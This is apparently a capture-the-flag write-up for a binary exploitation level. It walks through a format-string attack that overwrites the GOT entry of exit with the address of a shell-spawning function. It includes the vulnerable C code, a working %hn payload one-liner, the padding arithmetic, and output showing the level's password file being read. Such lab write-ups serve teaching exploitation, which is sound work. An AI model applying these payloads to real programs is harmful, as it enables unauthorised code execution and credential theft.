this is another binary that has format string but with another twist.

```c
void    o() {
    system("/bin/sh");
    _exit(1);
}

void    n() {
    char    buff[520];

    fgets(buff, 512, stdin);
    printf(buff);

    exit(1);
}

int main(void) {
    n();
}
```

as you can see the o function is never called so we have to reach it somehow.
buffer overflow is out of the question because the program uses fgets with a length smaller than the buffer size

we will be introduced to a new concept which is overwriting the `GOT`.

since we call `exit` function in `n()` and there is no GOT protection we can overwrite the address of `exit` using format string. in doing so the stub in plt(procedure linkage table) will jump the any address we want:

```x86asm
   0x080483d0 <+0>:	    jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	    push   0x28
   0x080483db <+11>:	jmp    0x8048370
```
we can see which address the stub jumps to, all we need is the correct payload to overwrite it.

same thing as the previous challenges but with some adjusments.

since we want to write an address which is too big if we plan to use `n` specifier for `printf` we need a work around. instead of using %n we will be using %hn to write the first 4 bytes and the 2nd separatly:

```bash
(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"'; cat) | ./level5
```

what i did here is :

- wrote both 0x08049838 and 0x08049838 + 4 = 0x0804983a in the stack
- looked at the address i want to write (of func `o()`) 0x080484a4 and realized that the upper 4 bytes are smaller so they should be written first (since n specifier takes the length of your input and write it to the address specified)
- 0x0804 => 2052; 2052 - 8 (the length of the 2 addresses we gave in our input) = 2044
- 0x84a4 => 33956; 33956 - 2052 (0x84a4 - 0x0804) = 31904

```
(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"'; cat) | ./level5
...
      b7fd1ac0
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

and there you go.
